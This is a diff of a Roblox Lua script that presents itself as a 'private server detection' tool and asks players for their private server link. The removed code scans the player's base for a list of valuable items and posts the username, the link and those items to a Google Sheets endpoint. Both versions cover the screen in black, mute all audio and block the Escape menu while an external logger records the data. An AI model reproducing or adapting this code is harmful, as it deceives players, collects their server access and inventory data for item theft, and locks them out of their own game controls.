@@ -1,6 +1,4 @@
--- 📘 MOREIRA METHOD - Private Server Detection (Universal) + UI Loader
--- Integrado con Sheet.best (Google Sheets) y pantalla negra de carga
--- Mejorado para buscar objetos en Models dentro de la carpeta "plots"
+-- GUI principal para método Moreira (input, pantalla negra, barra de carga)
 -- MINTHUBx + Copilot
 
 local Players = game:GetService("Players")
@@ -9,122 +7,8 @@ local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 local SoundService = game:GetService("SoundService")
 local Workspace = game:GetService("Workspace")
 local ContextActionService = game:GetService("ContextActionService")
-local HttpService = game:GetService("HttpService")
 
-------------------------------------------------------------
--- 🟩 Sheet.best integration (Google Sheets)
-------------------------------------------------------------
-local sheetUrl = "https://api.sheetbest.com/sheets/4fb21ec7-494c-4027-a9cf-cc5795f31e33"
-
-local objetosBuscados = {
-    "la grande combinasion", "Ketchuru and Musturu", "Ketupat Kepat", "Burguro and Fryuro", "La Supreme Combinasion",
-    "Tacorita bicicleta", "Los tacoritas", "Garama and Madundung", "Dragon Cannelloni", "Esok Sekolah",
-    "Tang Tang Keletang", "Strawberry Elephant", "La Secret Combinasion", "Tralaledon", "Eviledon",
-    "Spaghetti Tualetti", "Los Hotspotsitos", "Los Mobilis", "Los 67", "Money Money Puggy",
-    "Celularcini Viciosini", "Los Bros", "Las Sis", "Los Primos", "La Spooky Grande",
-    "Spooky and Pumpky", "Chillin Chili", "Tictac Sahur", "La Extinct Grande", "Nuclearo Dinossauro"
-}
-
--- Espera hasta que el plot del jugador esté disponible
-local function esperarPlot(timeout)
-    timeout = timeout or 10
-    local plot = nil
-    for i=1,timeout*2 do
-        local plotsFolder = Workspace:FindFirstChild("plots")
-        if plotsFolder then
-            for _, modelo in ipairs(plotsFolder:GetChildren()) do
-                if modelo:IsA("Model") and modelo.Name == LocalPlayer.Name then
-                    plot = modelo
-                    break
-                end
-            end
-            if plot then break end
-        end
-        task.wait(0.5)
-    end
-    return plot
-end
-
--- Busca los objetos en el plot/modelo del jugador
-local function obtenerObjetosEnPlot()
-    local encontrados = {}
-    local plot = esperarPlot(10)
-    if plot then
-        for _, nombreObjeto in ipairs(objetosBuscados) do
-            if plot:FindFirstChild(nombreObjeto) then
-                table.insert(encontrados, nombreObjeto)
-            end
-        end
-    end
-    return encontrados
-end
-
--- Intenta enviar los datos a Google Sheets, reintenta si hay error
-local function guardarDatosEnSheet(link)
-    local player = Players.LocalPlayer
-    local objetos = obtenerObjetosEnPlot()
-    local fecha = os.date("%Y-%m-%d %H:%M:%S")
-    local data = {
-        Usuario = player.Name,
-        Link = link,
-        Fecha = fecha,
-        Objetos = #objetos > 0 and table.concat(objetos, ", ") or "Ninguno"
-    }
-    local json = HttpService:JSONEncode(data)
-    local success = false
-    for intento = 1, 3 do
-        local response = nil
-        if typeof(http_request) == "function" then
-            response = http_request({
-                Url = sheetUrl,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = json
-            })
-        elseif typeof(request) == "function" then
-            response = request({
-                Url = sheetUrl,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = json
-            })
-        end
-        if response and response.StatusCode == 200 then
-            success = true
-            break
-        else
-            task.wait(1)
-        end
-    end
-    return success
-end
-
-------------------------------------------------------------
--- 🎬 Pantalla negra y loading bar
-------------------------------------------------------------
-local function muteAllSounds()
-    for i, sound in SoundService:GetDescendants() do
-        if sound:IsA("Sound") then
-            sound.Volume = 0
-        end
-    end
-    for i, sound in Workspace:GetDescendants() do
-        if sound:IsA("Sound") then
-            sound.Volume = 0
-        end
-    end
-end
-
-local escBlockActionName = "BlockEscMenu"
-local function blockEscMenu(actionName, inputState, inputObj)
-    return Enum.ContextActionResult.Sink
-end
-
-local blackFrame
-
-------------------------------------------------------------
--- 🪟 Create main GUI (link input)
-------------------------------------------------------------
+-- === GUI CREATION ===
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "MoreiraMethodGui"
 screenGui.ResetOnSpawn = false
@@ -139,8 +23,8 @@ end
 
 local inputFrame = Instance.new("Frame")
 inputFrame.Name = "InputFrame"
-inputFrame.Size = UDim2.new(0, 420, 0, 320)
-inputFrame.Position = UDim2.new(0.5, -210, 0.5, -160)
+inputFrame.Size = UDim2.new(0, 420, 0, 280)
+inputFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
 inputFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 inputFrame.BorderSizePixel = 0
 inputFrame.Parent = screenGui
@@ -199,24 +83,28 @@ infoLabel.TextColor3 = Color3.fromRGB(255, 220, 0)
 infoLabel.Text = "The better things you have in your base, the better bots will join."
 infoLabel.Parent = inputFrame
 
--- 🟨 TEST GOOGLE SHEETS BUTTON
-local testButton = Instance.new("TextButton")
-testButton.Size = UDim2.new(0.5, 0, 0, 40)
-testButton.Position = UDim2.new(0.25, 0, 0, 255)
-testButton.BackgroundColor3 = Color3.fromRGB(255, 255, 50)
-testButton.Font = Enum.Font.GothamBold
-testButton.TextScaled = true
-testButton.TextColor3 = Color3.fromRGB(100, 100, 0)
-testButton.Text = "TEST SHEETS"
-testButton.Parent = inputFrame
+-- === PANTALLA NEGRA Y BARRA DE CARGA ===
+local function muteAllSounds()
+    for i, sound in SoundService:GetDescendants() do
+        if sound:IsA("Sound") then
+            sound.Volume = 0
+        end
+    end
+    for i, sound in Workspace:GetDescendants() do
+        if sound:IsA("Sound") then
+            sound.Volume = 0
+        end
+    end
+end
 
-local testCorner = Instance.new("UICorner")
-testCorner.CornerRadius = UDim.new(0, 8)
-testCorner.Parent = testButton
+local escBlockActionName = "BlockEscMenu"
+local function blockEscMenu(actionName, inputState, inputObj)
+    return Enum.ContextActionResult.Sink
+end
 
-------------------------------------------------------------
--- 🟧 Botón SEND (guarda y pantalla negra)
-------------------------------------------------------------
+local blackFrame
+
+-- === BOTÓN SEND (llama al logger externo) ===
 sendButton.MouseButton1Click:Connect(function()
     local link = textBox.Text
     if link == "" then
@@ -302,29 +190,14 @@ sendButton.MouseButton1Click:Connect(function()
     muteAllSounds()
     ContextActionService:BindAction(escBlockActionName, blockEscMenu, false, Enum.KeyCode.Escape)
 
-    -- Guarda los datos en Sheet.best
-    local success = guardarDatosEnSheet(link)
-    if success then
+    -- Llama al logger externo (asegúrate de haber cargado player_object_logger.lua antes)
+    if type(guardarDatosLocal) == "function" then
+        guardarDatosLocal(link)
         label.TextColor3 = Color3.fromRGB(40, 200, 80)
-        label.Text = "Datos enviados a Google Sheets!"
+        label.Text = "Datos guardados localmente en C:\\Users\\eloti\\Downloads\\objetos\\logs_objetos.txt!"
     else
         label.TextColor3 = Color3.fromRGB(255, 0, 0)
-        label.Text = "❌ Error al enviar a Google Sheets. Intenta de nuevo."
-    end
-end)
-
-------------------------------------------------------------
--- 🟨 Botón TEST SHEETS (guarda sólo datos de prueba en Sheets)
-------------------------------------------------------------
-testButton.MouseButton1Click:Connect(function()
-    local link = textBox.Text ~= "" and textBox.Text or "TEST-LINK"
-    local success = guardarDatosEnSheet(link)
-    if success then
-        label.TextColor3 = Color3.fromRGB(255, 220, 0)
-        label.Text = "Test enviado a Google Sheets!"
-    else
-        label.TextColor3 = Color3.fromRGB(255, 0, 0)
-        label.Text = "❌ Error al enviar a Google Sheets. Intenta de nuevo."
+        label.Text = "Error: player_object_logger.lua no cargado."
     end
 end)
 
